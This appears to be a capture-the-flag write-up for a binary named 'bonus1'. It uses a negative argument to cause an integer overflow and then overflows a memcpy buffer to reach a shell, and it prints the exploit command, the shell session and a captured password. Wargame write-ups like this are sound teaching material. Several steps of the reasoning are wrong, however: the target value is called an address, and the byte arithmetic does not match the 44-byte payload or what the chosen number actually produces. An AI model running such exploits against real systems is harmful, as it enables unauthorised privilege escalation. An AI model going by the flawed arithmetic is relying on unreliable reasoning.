# bonus1

We need to set `n` to a value `< 10`. But to run the shell, `n` needs to have the value `0x574f4c46` (`1464814662` in decimal).

In order to do this, we can use a number `< 10`, which will pass the first condition.  
Then, to set `n` to the value `0x574f4c46`, we can actually write it directly in the memory by overflowing `buffer` with `memcpy()`.

The buffer is `40` bytes long and `n` address, which is `0x574f4c46`, is right after the buffer's address.  
Because whatever `n` is, there will be `n * 4` bytes copied into the buffer, we need to find a value `n` such that `n * 4` is `40`.

```
4294967295 / 4 = 1073741823
We remove 40 bytes from this :
1073741823 - 40 = 1073741783
```

```sh
$> ./bonus1 -1073741783 $(python -c 'print("A"*40 + "\x46\x4c\x4f\x57")')
$ whoami
bonus2
$ cat /home/user/bonus2/.pass
579bd19263eb8655e4cf7b742d75edf8c38226925d78db8163506f519182524
```
